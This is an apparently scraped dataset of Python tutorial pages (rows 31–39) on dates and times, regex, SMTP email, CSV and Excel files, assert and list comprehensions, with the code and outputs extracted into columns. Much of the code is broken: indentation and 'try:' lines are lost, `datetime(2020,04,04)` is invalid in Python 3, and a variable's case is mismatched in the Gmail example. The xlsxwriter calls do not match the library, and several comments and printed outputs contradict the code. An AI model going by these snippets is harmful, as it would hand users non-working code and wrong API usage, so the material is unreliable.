31,['Python Date and time'],"['Python provides the datetime module work with real dates and times. In real-world applications, we need to work with the date and time. Python enables us to schedule our Python script to run at a particular timing.']","['https://www.javatpoint.com/python-regex', 'https://www.javatpoint.com/python-exception-handling', 'https://www.javatpoint.com/python-regex', 'https://www.javatpoint.com/python-exception-handling', 'https://www.javatpoint.com/python-regex']",['https://static.javatpoint.com/python/images/python-date-and-time.png'],[],"['Tick', 'How to get the current time?', 'Time tuple', 'Getting formatted time', 'Python sleep time', 'The datetime Module', 'Creating date objects', 'Comparison of two dates', 'The calendar module', 'Printing the calendar of whole year']",[],[],"['In Python, the date is not a data type, but we can work with the date objects by importing the module named with datetime, time, and calendar.', 'In this section of the tutorial, we will discuss how to work with the date and time objects in Python.', 'The datetime classes are classified in the six main classes.', 'Consider the following example', 'The localtime() functions of the time module are used to get the current time tuple. Consider the following example.', ""The time is treated as the tuple of 9 numbers. Let's look at the members of the time tuple."", 'The time can be formatted by using the asctime() function of the time module. It returns the formatted time for the time tuple being passed.', 'Consider the following example.', 'The datetime module enables us to create the custom date objects, perform various operations on dates like the comparison, etc.', 'To work with dates as date objects, we have to import the datetime module into the python source code.', 'Consider the following example to get the datetime object representation for the current time.', 'We can create the date objects bypassing the desired date in the datetime constructor for which the date objects are to be created.', 'Consider the following example.', 'We can also specify the time along with the date to create the datetime object. Consider the following example.', 'In the above code, we have passed in datetime() function year, month, day, hour, minute, and millisecond attributes in a sequential manner.', 'We can compare two dates by using the comparison operators like >, >=, <, and <=.', 'Consider the following example.', 'Python provides a calendar object that contains various methods to work with the calendars.', 'Consider the following example to print the calendar for the last month of 2018.']","['In Python, the time instants are counted since 12 AM, 1st January 1970. The function time() of the module time returns the total number of ticks spent since 12 AM, 1st January 1970. A tick can be seen as the smallest unit to measure the time.', 'The sleep() method of time module is used to stop the execution of the script for a given amount of time. The output will be delayed for the number of seconds provided as the float.', 'The prcal() method of calendar module is used to print the calendar of the entire year. The year of which the calendar is to be printed must be passed into this method.']",[],"['import time;', '#prints the number of ticks spent since 12 AM, 1st January 1970', 'print(time.time())', 'import time;', '#returns a time tuple', 'print(time.localtime(time.time()))', 'import time', '#returns the formatted time', 'print(time.asctime(time.localtime(time.time())))', 'import time', 'for i in range(0,5):', 'print(i)', '#Each element will be printed after 1 second', 'time.sleep(1)', 'import datetime', '#returns the current datetime object', 'print(datetime.datetime.now())', 'import datetime', '#returns the datetime object for the specified date', 'print(datetime.datetime(2020,04,04))', 'import datetime', '#returns the datetime object for the specified time', 'print(datetime.datetime(2020,4,4,1,26,40))', 'from datetime import datetime as dt', '#Compares the time. If the time is in between 8AM and 4PM, then it prints working hours otherwise it prints fun hours', 'if dt(dt.now().year,dt.now().month,dt.now().day,8)<dt.now()<dt(dt.now().year,dt.now().month,dt.now().day,16):', 'print(""Working hours...."")', 'print(""fun hours"")', 'import calendar;', 'cal = calendar.month(2020,3)', '#printing the calendar of December 2018', 'print(cal)', 'import calendar', '#printing the calendar of the year 2019', 's = calendar.prcal(2020)']","['1585928913.6519969', 'time.struct_time(tm_year=2020, tm_mon=4, tm_mday=3, tm_hour=21, tm_min=21, tm_sec=40, tm_wday=4, tm_yday=94, tm_isdst=0)', 'Tue Dec 18 15:31:39 2018', '0\n1\n2\n3\n4', '2020-04-04 13:18:35.252578', '2020-04-04 00:00:00', '2020-04-04 01:26:40', 'fun hours', 'March 2020\nMo Tu We Th Fr Sa Su\n                   1\n 2  3  4  5  6  7  8\n 9 10 11 12 13 14 15\n16 17 18 19 20 21 22\n23 24 25 26 27 28 29\n30 31']","['Index|||Attribute|||Values&&&0|||Year|||4 digit (for example 2018)&&&1|||Month|||1 to 12&&&2|||Day|||1 to 31&&&3|||Hour|||0 to 23&&&4|||Minute|||0 to 59&&&5|||Second|||0 to 60&&&6|||Day of weak|||0 to 6&&&7|||Day of year|||1 to 366&&&8|||Daylight savings|||-1, 0, 1 , or -1']","['|||date - It is a naive ideal date. It consists of the year, month, and day as attributes.|||time - It is a perfect time, assuming every day has precisely 24*60*60 seconds. It has hour, minute, second, microsecond, and tzinfo as attributes.|||datetime - It is a grouping of date and time, along with the attributes year, month, day, hour, minute, second, microsecond, and tzinfo.|||timedelta - It represents the difference between two dates, time or datetime instances to microsecond resolution.|||tzinfo - It provides time zone information objects.|||timezone - It is included in the new version of Python. It is the class that implements the tzinfo abstract base class.|||']"
32,['Python Regular Expressions'],['The regular expressions can be defined as the sequence of characters which are used to search for a pattern in a string. The module re provides the support to use regex in the python program. The re module throws an exception if there is some error while using the regular expression. '],"['https://www.javatpoint.com/python-oops-concepts', 'https://www.javatpoint.com/python-date', 'https://www.javatpoint.com/python-oops-concepts', 'https://www.javatpoint.com/python-date', 'https://www.javatpoint.com/python-oops-concepts']",[],[],"['Regex Functions ', 'Forming a regular expression ', 'The match object ']","['Meta-Characters', 'Special Sequences ', 'Sets', 'The findall() function ', 'Example', 'The Match object methods ', 'Example']",[],"['The re module must be imported to use the regex functionalities in python. ', 'The following regex functions are used in the python. ', 'A regular expression can be formed by using the mix of meta-characters, special sequences, and sets. ', 'Metacharacter is a character with the specified meaning. ', 'Special sequences are the sequences containing \\ followed by one of the characters. ', 'A set is a group of characters given inside a pair of square brackets. It represents the special meaning. ', 'Consider the following example. ', 'The match object contains the information about the search and the output. If there is no match found, the None object is returned. ', 'There are the following methods associated with the Match object. ']","['This method returns a list containing a list of all matches of a pattern within the string. It returns the patterns in the order they are found. If there are no matches, then an empty list is returned. ']",[],"['import re', 'import re', 'str = ""How are you. How is everything""', 'matches = re.findall(""How"", str)', 'print(matches)', 'print(matches)', 'import re', 'str = ""How are you. How is everything""', 'matches = re.search(""How"", str)', 'print(type(matches))', 'print(matches) #matches is the search object', 'import re', 'str = ""How are you. How is everything""', 'matches = re.search(""How"", str)', 'print(matches.span())', 'print(matches.group())', 'print(matches.string)']","[""['How', 'How']"", ""<class '_sre.SRE_Match'>"", ""<_sre.SRE_Match object; span=(0, 3), match='How'>"", '(0, 3)', 'How', 'How are you. How is everything']","['SN|||Function|||Description&&&1|||match|||This method matches the regex pattern in the string with the optional flag. It returns true if a match is found in the string otherwise it returns false. &&&2|||search|||This method returns the match object if there is a match found in the string. &&&3|||findall|||It returns a list that contains all the matches of a pattern in the string. &&&4|||split|||Returns a list in which the string has been split in each match. &&&5|||sub|||Replace one or many matches in the string.', 'Metacharacter|||Description|||Example&&&[]|||It represents the set of characters.|||""[a-z]""&&&\\|||It represents the special sequence.|||""\\r""&&&.|||It signals that any character is present at some specific place.|||""Ja.v.""&&&^|||It represents the pattern present at the beginning of the string.|||""^Java""&&&$|||It represents the pattern present at the end of the string.|||""point""&&&*|||It represents zero or more occurrences of a pattern in the string.|||""hello*""&&&+|||It represents one or more occurrences of a pattern in the string.|||""hello+""&&&{}|||The specified number of occurrences of a pattern the string.|||""java{2}""&&&||||It represents either this or that character is present.|||""java|point""&&&()|||Capture and group|||', ""Character|||Description&&&\\A|||It returns a match if the specified characters are present at the beginning of the string. &&&\\b|||It returns a match if the specified characters are present at the beginning or the end of the string.&&&\\B|||It returns a match if the specified characters are present at the beginning of the string but not at the end. &&&\\d|||It returns a match if the string contains digits [0-9]. &&&\\D|||It returns a match if the string doesn't contain the digits [0-9].&&&\\s|||It returns a match if the string contains any white space character.&&&\\S|||It returns a match if the string doesn't contain any white space character. &&&\\w|||It returns a match if the string contains any word characters. &&&\\W|||It returns a match if the string doesn't contain any word. &&&\\Z|||Returns a match if the specified characters are at the end of the string. "", 'SN|||Set|||Description&&&1|||[arn]|||Returns a match if the string contains any of the specified characters in the set. &&&2|||[a-n]|||Returns a match if the string contains any of the characters between a to n.&&&3|||[^arn]|||Returns a match if the string contains the characters except a, r, and n. &&&4|||[0123]|||Returns a match if the string contains any of the specified digits. &&&5|||[0-9]|||Returns a match if the string contains any digit between 0 and 9. &&&6|||[0-5][0-9]|||Returns a match if the string contains any digit between 00 and 59.&&&10|||[a-zA-Z]|||Returns a match if the string contains any alphabet (lower-case or upper-case). ']",['|||span(): It returns the tuple containing the starting and end position of the match. |||string(): It returns a string passed into the function.|||group(): The part of the string is returned where the match is found. |||']
33,['Python Sending Email using SMTP'],['Simple Mail Transfer Protocol (SMTP) is used as a protocol to handle the email transfer using Python. It is used to route emails between email servers. It is an application layer protocol which allows to users to send mail to another. The receiver retrieves email using the protocols POP(Post Office Protocol) and IMAP(Internet Message Access Protocol).'],"['https://www.javatpoint.com/python-read-csv-file', 'https://www.javatpoint.com/python-sending-email', 'https://www.javatpoint.com/https://www.javatpoint.com/', 'https://www.javatpoint.com/python-read-csv-file', 'https://www.javatpoint.com/python-sending-email', 'https://www.javatpoint.com/python-read-csv-file']","['https://static.javatpoint.com/python/images/python-sending-email.png', 'https://static.javatpoint.com/python/images/python-sending-email2.jpg']",[],"['Sending email from gmail ', 'Sending HTML in email ']",[],[],"['When the server listens for the TCP connection from a client, it initiates a connection on port 587.', 'The SMTP object is used for the email transfer. The following syntax is used to create the smtplib object.', 'It accepts the following parameters. ', 'The sendmail() method of the SMTP object is used to send the mail to the desired machine. The syntax is given below.', 'Use the following syntax.', ""This may make your Gmail ask you for access to less secure apps if you're using Gmail. You will need to turn this ON temporarily for this to work."", 'Consider the following example.', 'We can format the HTML in the message by specifying the MIME version, content-type, and character set to send the HTML.', 'Consider the following example.']","['Python provides a smtplib module, which defines an the SMTP client session object used to send emails to an internet machine. For this purpose, we have to import the smtplib module using the import statement.', 'There are cases where the emails are sent using the Gmail SMTP server. In this case, we can pass Gmail as the SMTP server instead of using the localhost with the port 587.', 'Here, we need to login to the Gmail account using Gmail user name and password. For this purpose, the smtplib provide the login() method, which accepts the username and password of the sender.']",[],"['$ import smtplib', 'import smtplib', 'smtpObj = smtplib.SMTP(host, port, local_hostname)', 'smtpObj.sendmail(sender, receiver, message)', '#!/usr/bin/python3', 'import smtplib', ""sender_mail = 'sender@fromdomain.com'"", ""receivers_mail = ['reciever@todomain.com']"", 'message = """"""From: From Person %s', 'To: To Person %s', 'Subject: Sending SMTP e-mail', 'This is a test e-mail message.', '""""""%(sender_mail,receivers_mail)', ""smtpObj = smtplib.SMTP('localhost')"", 'smtpObj.sendmail(sender_mail, receivers_mail, message)', 'print(""Successfully sent email"")', 'except Exception:', 'print(""Error: unable to send email"")', '$ smtpObj = smtplib.SMTP(""gmail.com"", 587)', '#!/usr/bin/python3', 'import smtplib', ""sender_mail = 'sender@gmail.com'"", ""receivers_mail = ['reciever@gmail.com']"", 'message = """"""From: From Person %s', 'To: To Person %s', 'Subject: Sending SMTP e-mail', 'This is a test e-mail message.', '""""""%(sender_mail,receivers_mail)', ""password = input('Enter the password');"", ""smtpObj = smtplib.SMTP('gmail.com',587)"", 'smtpobj.login(sender_mail,password)', 'smtpObj.sendmail(sender_mail, receivers_mail, message)', 'print(""Successfully sent email"")', 'except Exception:', 'print(""Error: unable to send email"")', '#!/usr/bin/python3', 'import smtplib', ""sender_mail = 'sender@fromdomain.com'"", ""receivers_mail = ['reciever@todomain.com']"", 'message = """"""From: From Person %s', 'To: To Person %s', 'MIME-Version:1.0', 'Content-type:text/html', 'Subject: Sending SMTP e-mail', '<h3>Python SMTP</h3>', '<strong>This is a test e-mail message.</strong>', '""""""%(sender_mail,receivers_mail)', ""smtpObj = smtplib.SMTP('localhost')"", 'smtpObj.sendmail(sender_mail, receivers_mail, message)', 'print(""Successfully sent email"")', 'except Exception:', 'print(""Error: unable to send email"")']",[],[],"['|||host: It is the hostname of the machine which is running your SMTP server. Here, we can specify the IP address of the server like (https://www.javatpoint.com) or localhost. It is an optional parameter.|||port: It is the port number on which the host machine is listening to the SMTP connections. It is 25 by default.|||local_hostname: If the SMTP server is running on your local machine, we can mention the hostname of the local machine.|||']"
34,['Python read csv file'],"['A csv stands for ""comma separated values"", which is defined as a simple file format that uses specific structuring to arrange tabular data. It stores tabular data such as spreadsheet or database in plain text and has a common format for data interchange. A csv file opens into the excel sheet, and the rows and columns data define the standard format.']","['https://www.javatpoint.com/python-write-csv-file', 'https://www.javatpoint.com/python-sending-email', 'https://www.javatpoint.com/python-write-csv-file', 'https://www.javatpoint.com/python-sending-email', 'https://www.javatpoint.com/python-write-csv-file']",[],[],"['CSV File', 'Python CSV Module Functions', 'Reading CSV files', 'Read a CSV into a Dictionar', 'Reading csv files with Pandas']",[],[],"['Python provides various functions to read csv file. We are describing few method of reading function.', 'In Python, the csv.reader() module is used to read the csv file. It takes each row of the file and makes a list of all the columns.', 'We have taken a txt file named as python.txt that have default delimiter comma(,) with the following data:', 'We can also use DictReader() function to read the csv file directly into a dictionary rather than deal with a list of individual string elements.', 'Again, our input file, python.txt is as follows:', 'Here, we are taking a slightly more complicated file to read, called hrdata.csv, which contains data of company employees.', 'In the above code, the three lines are enough to read the file, and only one of them is doing the actual work, i.e., pandas.read_csv()']","['The CSV module work is used to handle the CSV files to read/write and get data from specified columns. There are different types of CSV functions, which are as follows:', 'The Pandas is defined as an open-source library which is built on the top of the NumPy library. It provides fast analysis, data cleaning, and preparation of the data for the user.', ""Reading the csv file into a pandas DataFrame is quick and straight forward. We don't need to write enough lines of code to open, analyze, and read the csv file in pandas and it stores the data in DataFrame.""]","[""In the above code, we have opened 'python.csv' using the open() function. We used csv.reader() function to read the file, that returns an iterable reader object. The reader object have consisted the data and we iterated using for loop to print the content of each row""]","['name,department,birthday month', 'Parker,Accounting,November', 'Smith,IT,October', 'import csv', ""with open('python.csv') as csv_file:"", ""csv_reader = csv.reader(csv_file, delimiter=',')"", 'line_count = 0', 'for row in csv_reader:', 'if line_count == 0:', 'print(f\'Column names are {"", "".join(row)}\')', 'line_count += 1', 'name,department,birthday month', 'Parker,Accounting,November', 'Smith,IT,October', 'import csv', ""with open('python.txt', mode='r') as csv_file:"", 'csv_reader = csv.DictReader(csv_file)', 'line_count = 0', 'for row in csv_reader:', 'if line_count == 0:', 'print(f\'The Column names are as follows {"", "".join(row)}\')', 'line_count += 1', 'print(f\'\\t{row[""name""]} works in the {row[""department""]} department, and was born in {row[""birthday month""]}.\')', 'line_count += 1', ""print(f'Processed {line_count} lines.')"", 'Name,Hire Date,Salary,Leaves Remaining', 'John Idle,08/15/14,50000.00,10', 'Smith Gilliam,04/07/15,65000.00,8', 'Parker Chapman,02/21/14,45000.00,10', 'Jones Palin,10/14/13,70000.00,3', 'Terry Gilliam,07/22/14,48000.00,7', 'Michael Palin,06/28/13,66000.00,8', 'import pandas', ""df = pandas.read_csv('hrdata.csv')"", 'print(df)']","['Column names are name, department, birthday month', 'Parker works in the Accounting department, and was born in November.', 'Smith works in the IT department, and was born in October.', 'Processed 3 lines.', 'The Column names are as follows name, department, birthday month', 'Parker works in the Accounting department, and was born in November.', 'Smith works in the IT department, and was born in October.', 'Processed 3 lines.', 'Name                Hire Date     Salary      Leaves Remaining', '0     John Idle              03/15/14      50000.0       10', '1     Smith Gilliam          06/01/15      65000.0       8', '2     Parker Chapman         05/12/14      45000.0       10', '3     Jones Palin            11/01/13      70000.0       3', '4     Terry Gilliam          08/12/14      48000.0       7', '5     Michael Palin          05/23/13      66000.0       8']",[],"['|||csv.field_size_limit - It returns the current maximum field size allowed by the parser.|||csv.get_dialect - It returns the dialect associated with a name.|||csv.list_dialects - It returns the names of all registered dialects.|||csv.reader - It read the data from a csv file|||csv.register_dialect - It associates dialect with a name. The name must be a string or a Unicode object.|||csv.writer - It writes the data to a csv file|||o\tcsv.unregister_dialect - It deletes the dialect which is associated with the name from the dialect registry. If a name is not a registered dialect name, then an error is being raised.|||csv.QUOTE_ALL - It instructs the writer objects to quote all fields. csv.QUOTE_MINIMAL - It instructs the writer objects to quote only those fields which contain special characters such as quotechar, delimiter, etc.|||csv.QUOTE_NONNUMERIC - It instructs the writer objects to quote all the non-numeric fields.|||csv.QUOTE_NONE - It instructs the writer object never to quote the fields.||||||Using csv.reader() function|||']"
35,['Python Write CSV File'],"['A CSV stands for ""comma-separated values"", which is defined as a simple file format that uses specific structuring to arrange tabular data. It stores tabular data such as spreadsheet or database in plain text and has a standard format for data interchange. The CSV file opens into the excel sheet, and the rows and columns data define the standard format.']","['https://www.javatpoint.com/python-read-excel-file', 'https://www.javatpoint.com/python-read-csv-file', 'https://www.javatpoint.com/python-read-excel-file', 'https://www.javatpoint.com/python-read-csv-file', 'https://www.javatpoint.com/python-read-excel-file']",[],[],"['CSV File', 'Python CSV Module Functions', 'Writing CSV Files', 'Write a CSV into a Dictionary', 'Writing CSV Files Using Pandas']","['Example -', 'Example -', 'Example -']",[],"[""Let's write the following data to a CSV File."", ""It returns the file named as 'Python.csv' that contains the following data:"", 'We can also use the class DictWriter to write the CSV file directly into a dictionary.', 'A file named as python.csv contains the following data:', 'Parker, Accounting, November', 'Smith, IT, October']","['The CSV module work is to handle the CSV files to read/write and get data from specified columns. There are different types of CSV functions, which are as follows:', 'We can also write any new and existing CSV files in Python by using the csv.writer() module. It is similar to the csv.reader() module and also has two methods, i.e., writer function or the Dict Writer class.', 'It presents two functions, i.e., writerow() and writerows(). The writerow() function only write one row, and the writerows() function write more than one row.\nDialects', 'It is defined as a construct that allows you to create, store, and re-use various formatting parameters. It supports several attributes; the most frequently used are:', 'Pandas is defined as an open source library which is built on the top of Numpy library. It provides fast analysis, data cleaning and preparation of the data for the user.']","['It is as easy as reading the CSV file using pandas. You need to create the DataFrame, which is a two-dimensional, heterogeneous tabular data structure and consists of three main components- data, columns, and rows.\nHere, we take a slightly more complicated file to read, called hrdata.csv, which contains data of company employees.']","[""data = [{'Rank': 'B', 'first_name': 'Parker', 'last_name': 'Brian'},"", ""{'Rank': 'A', 'first_name': 'Smith', 'last_name': 'Rodriguez'},"", ""{'Rank': 'C', 'first_name': 'Tom', 'last_name': 'smith'},"", ""{'Rank': 'B', 'first_name': 'Jane', 'last_name': 'Oscar'},"", ""{'Rank': 'A', 'first_name': 'Alex', 'last_name': 'Tim'}]"", 'import csv', ""with open('Python.csv', 'w') as csvfile:"", ""fieldnames = ['first_name', 'last_name', 'Rank']"", 'writer = csv.DictWriter(csvfile, fieldnames=fieldnames)', 'writer.writeheader()', ""writer.writerow({'Rank': 'B', 'first_name': 'Parker', 'last_name': 'Brian'})"", ""writer.writerow({'Rank': 'A', 'first_name': 'Smith',"", ""'last_name': 'Rodriguez'})"", ""writer.writerow({'Rank': 'B', 'first_name': 'Jane', 'last_name': 'Oscar'})"", ""writer.writerow({'Rank': 'B', 'first_name': 'Jane', 'last_name': 'Loive'})"", 'print(""Writing complete"")', 'first_name,last_name,Rank', 'Parker,Brian,B', 'Smith,Rodriguez,A', 'Jane,Oscar,B', 'Jane,Loive,B', 'import csv', ""with open('python.csv', mode='w') as csv_file:"", ""fieldnames = ['emp_name', 'dept', 'birth_month']"", 'writer = csv.DictWriter(csv_file, fieldnames=fieldnames)', 'writer.writeheader()', ""writer.writerow({'emp_name': 'Parker', 'dept': 'Accounting', 'birth_month': 'November'})"", ""writer.writerow({'emp_name': 'Smith', 'dept': 'IT', 'birth_month': 'October'})"", 'Name,Hire Date,Salary,Leaves Remaining', 'John Idle,08/15/14,50000.00,10', 'Smith Gilliam,04/07/15,65000.00,8', 'Parker Chapman,02/21/14,45000.00,10', 'Jones Palin,10/14/13,70000.00,3', 'Terry Gilliam,07/22/14,48000.00,7', 'Michael Palin,06/28/13,66000.00,8', 'import pandas', ""df = pandas.read_csv('hrdata.csv',"", ""index_col='Employee',"", ""parse_dates=['Hired'],"", 'header=0,', ""names=['Employee', 'Hired', 'Salary', 'Sick Days'])"", ""df.to_csv('hrdata_modified.csv')""]","['Writing complete', 'emp_name,dept,birth_month', 'Parker,Accounting,November', 'Smith,IT,October', 'Employee, Hired, Salary, Sick Days', 'John Idle, 2014-03-15, 50000.0,10', 'Smith Gilliam, 2015-06-01, 65000.0,8', 'Parker Chapman, 2014-05-12, 45000.0,10', 'Jones Palin, 2013-11-01, 70000.0,3', 'Terry Gilliam, 2014-08-12 , 48000.0,7', 'Michael Palin, 2013-05-23, 66000.0,8']",[],"[""|||csv.field_size_limit - It returns the current maximum field size allowed by the parser.|||csv.get_dialect - Returns the dialect associated with a name.|||csv.list_dialects - Returns the names of all registered dialects.|||csv.reader - Read the data from a CSV file|||csv.register_dialect - It associates dialect with a name, and name must be a string or a Unicode object.|||csv.writer - Write the data to a CSV file|||csv.unregister_dialect - It deletes the dialect, which is associated with the name from the dialect registry. If a name is not a registered dialect name, then an error is being raised.|||csv.QUOTE_ALL - It instructs the writer objects to quote all fields.|||csv.QUOTE_MINIMAL - It instructs the writer objects to quote only those fields which contain special characters such as quotechar, delimiter, etc.|||csv.QUOTE_NONNUMERIC - It instructs the writer objects to quote all the non-numeric fields.|||csv.QUOTE_NONE - It instructs the writer object never to quote the fields.||||||Dialect.delimiter: This attribute is used as the separating character between the fields. The default value is a comma (,).|||Dialect.quotechar: This attribute is used to quote fields that contain special characters.|||Dialect.lineterminator: It is used to create new lines, and the default value is '\\r\\n'.|||""]"
36,['Python read excel file'],"['Excel is a spreadsheet application which is developed by Microsoft. It is an easily accessible tool to organize, analyze, and store the data in tables. It is widely used in many different applications all over the world. From Analysts to CEOs, various professionals use Excel for both quick stats and serious data crunching.']","['https://www.javatpoint.com/python-write-excel-file', 'https://www.javatpoint.com/python-write-csv-file', 'https://www.javatpoint.com/https://www.javatpoint.com/python-openpyxl', 'https://www.javatpoint.com/python-write-excel-file', 'https://www.javatpoint.com/python-write-csv-file', 'https://www.javatpoint.com/python-write-excel-file']",['https://static.javatpoint.com/python/images/python-read-excel-file.png'],[],"['Excel Documents', 'Reading from an Excel file', 'Creating a Workbook', 'Reading from the Pandas', 'Reading from the openpyxl']",[],[],"['The active sheet is defined as a sheet in which the user is currently viewing or last viewed before closing Excel.', 'First, you need to write a command to install the xlrd module.', 'Input File', 'We have taken the snapshot of the workbook. ', 'It is a python package which provides a beneficial data structure called a data frame.', 'First, we need to install an openpyxl module using pip from the command line.', 'After that, we need to import the module.', 'To learn more about openpyxl, visit our complete tutorial Click Here. We have discussed essential detail in this tutorial.']","['A workbook contains all the data in the excel file. You can create a new workbook from scratch, or you can easily create a workbook from the excel file that already exists.', 'Explanation: In the above example, firstly, we have imported the xlrd module and defined the location of the file. Then we have opened the workbook from the excel file that already exists.', 'Pandas is defined as an open-source library which is built on the top of the NumPy library. It provides fast analysis, data cleaning, and preparation of the data for the user and supports both xls and xlsx extensions from the URL.', 'We can also read data from the existing spreadsheet using openpyxl. It also allows the user to perform calculations and add content that was not part of the original dataset.']","['An Excel spreadsheet document is called a workbook which is saved in a file with .xlsx extension. The first row of the spreadsheet is mainly reserved for the header, while the first column identifies the sampling unit. Each workbook can contain multiple sheets that are also called a worksheets. A box at a particular column and row is called a cell, and each cell can include a number or text value. The grid of cells with data forms a sheet.']","['pip install xlrd', '# Import the xlrd module', 'import xlrd', '# Define the location of the file', 'loc = (""path of file"")', '# To open the Workbook', 'wb = xlrd.open_workbook(loc)', 'sheet = wb.sheet_by_index(0)', '# For row 0 and column 0', 'sheet.cell_value(0, 0)', 'Example -', 'import pandas as pd', '# Read the file', 'data = pd.read_csv("".csv"", low_memory=False)', '# Output the number of rows', 'print(""Total rows: {0}"".format(len(data)))', '# See which headers are available', 'print(list(data))', 'pip install openpyxl', 'import openpyxl', 'my_wb = openpyxl.Workbook()', 'my_sheet = my_wb.active', 'my_sheet_title = my_sheet.title', 'print(""My sheet title: "" + my_sheet_title)']",['My sheet title: Sheet'],[],[]
37,['Python Write Excel File'],['The Python write excel file is used to perform the multiple operations on a spreadsheet using the xlwt module. It is an ideal way to write data and format information to files with .xls extension.'],"['https://www.javatpoint.com/python-assert-keyword', 'https://www.javatpoint.com/python-read-excel-file', 'https://www.javatpoint.com/python-assert-keyword', 'https://www.javatpoint.com/python-read-excel-file', 'https://www.javatpoint.com/python-assert-keyword']",['https://static.javatpoint.com/python/images/python-write-excel-file.png'],[],"['Write Excel File Using xlsxwriter Module', 'Write Excel File Using openpyxl Module', 'Writing data to Excel files with xlwt', 'Writing Files with pyexcel']",[],"['Note- Throughout XlsxWriter, rows, and columns are zero-indexed. The first cell in a worksheet is listed as, A1 is (0,0), B1 is (0,1), A2 is (1,0), B2 is (1,1)......,and so on.']","['We need to use the following command to install xlsxwriter module:', 'It supports features such as formatting, images, charts, page setup, auto filters, conditional formatting, and many others.', 'Pandas have excellent methods for reading all kinds of data from excel files. We can also import the results back to pandas.', 'It allows us to specify the delimiter and add dest_delimiter argument. You can pass the symbol that you want to use as a delimiter in-between "" "".']","[""If you want to write data to any file and don't want to go through the trouble of doing everything by yourself, then you can use a for loop to automate the whole process a little bit."", 'It is defined as a package which is generally recommended if you want to read and write .xlsx, xlsm, xltx, and xltm files. You can check it by running type(wb).', 'The load_workbook() function takes an argument and returns a workbook object, which represents the file. Make sure that you are in the same directory where your spreadsheet is located. Otherwise, you will get an error while importing.', 'You can easily use a for loop with the help of the range() function to help you to print out the values of the rows that have values in column 2. If those particular cells are empty, you will get None.', 'You can easily export your arrays back to a spreadsheet by using the save_as() function and pass the array and name of the destination file to the dest_file_name argument.']","['We can also write the excel file using the xlsxwriter module. It is defined as a Python module for writing the files in the XLSX file format. It can also be used to write text, numbers, and formulas to multiple worksheets. Also, it supports features such as charts, formatting, images, page setup, auto filters, conditional formatting, and many others.', 'You can use the xlwt package, apart from the XlsxWriter package to create the spreadsheets that contain your data. It is an alternative package for writing data, formatting information, etc. and ideal for writing the data and format information to files with .xls extension. It can perform multiple operations on the spreadsheet.']","['pip install xlsxwriter', '# import xlsxwriter module', 'import xlsxwriter', ""book = xlsxwriter.Book('Example2.xlsx')"", 'sheet = book.add_sheet()', '# Rows and columns are zero indexed.', 'row = 0', 'column = 0', 'content = [""Parker"", ""Smith"", ""John""]', '# iterating through the content list', 'for item in content :', '# write operation perform', 'sheet.write(row, column, item)', '# incrementing the value of row by one with each iterations.', 'row += 1', '', 'book.close()']",[],[],[]
38,['Python Assert Keyword'],"['Python assert keyword is defined as a debugging tool that tests a condition. The Assertions are mainly the assumption that asserts or state a fact confidently in the program. For example, while writing a division function, the divisor should not be zero, and you assert that the divisor is not equal to zero.']","['https://www.javatpoint.com/python-list-comprehension', 'https://www.javatpoint.com/python-write-excel-file', 'https://www.javatpoint.com/python-list-comprehension', 'https://www.javatpoint.com/python-write-excel-file', 'https://www.javatpoint.com/python-list-comprehension']",[],[],[],"['Example1', 'Example2:', 'Runtime Exception :']",[],"['This example shows the working of assert with the error message.', 'This example shows the ""Divide by 0 error"" in the console.', 'x / y value is :', 'Explanation:']","['It is a debugging tool, and its primary task is to check the condition. If it finds that the condition is true, it moves to the next line of code, and If not, then stops all its operations and throws an error. It points out the error in the code.']","['It is merely a Boolean expression that has a condition or expression checks if the condition returns true or false. If it is true, the program does not do anything, and it moves to the next line of code. But if it is false, it raises an AssertionError exception with an optional error message.', 'The main task of assertions is to inform the developers about unrecoverable errors in the program like ""file not found"", and it is right to say that assertions are internal self-checks for the program. It is the most essential for the testing or quality assurance in any application development area. The syntax of the assert keyword is given below.', ""Explanation: In the above example, we have passed a non-empty list scores2 and an empty list scores1 to the avg() function. We received an output for scores2 list successfully, but after that, we got an error AssertionError: List is empty. The assert condition is satisfied by the scores2 list and lets the program continue to run. However, scores1 doesn't satisfy the condition and gives an AssertionError."", 'In the above example, we have initialized an integer variable, i.e., x=7, y=0, and try to print the value of x/y as an output. The Python interpreter generated a Runtime Exception because of the assert keyword found the divisor as zero then displayed ""Divide by 0 error"" in the console.']","['assert condition, error_message(optional)', 'def avg(scores):', 'assert len(scores) != 0,""The List is empty.""', 'return sum(scores)/len(scores)', 'scores2 = [67,59,86,75,92]', 'print(""The Average of scores2:"",avg(scores2))', 'scores1 = []', 'print(""The Average of scores1:"",avg(scores1))', '# initializing number', '# It uses assert to check for 0', 'print (""x / y value is : "")', 'assert y != 0, ""Divide by 0 error""', 'print (x / y)']","['The Average of scores2: 75.8\nAssertionError: The List is empty.', 'Traceback (most recent call last):  \n  File ""main.py"", line 6, in <module>  \n    assert y != 0, ""Divide by 0 error""  \nAssertionError: Divide by 0 error']",[],['|||Checking the outputs of the functions.|||Used for testing the code.|||In checking the values of arguments.Checking the valid input.|||']
39,['Python List Comprehension'],"['List Comprehension is defined as an elegant way to define, create a list in Python and consists of brackets that contains an expression followed by for clause. It is efficient in both computationally and in terms of coding space and time.']","['https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-tutorial']",[],[],[],"['Signature', 'Example', 'Example', 'Example']",[],"[""The list comprehension starts with '[' and ']'."", '[ expression for item in list if conditional ]']",[],[],"['letters = []', ""for letter in 'Python':"", 'letters.append(letter)', 'print(letters)', ""letters = [ letter for letter in 'Python' ]"", 'print( letters)', ""x = {'chrome': 'browser', 'Windows': 'OS', 'C': 'language'}"", ""x['mouse'] = 'hardware'"", ""print(x['Windows'])""]","[""['P', 'y', 't', 'h', 'o', 'n']"", ""['P', 'y', 't', 'h', 'o', 'n']"", 'OS']",[],[]
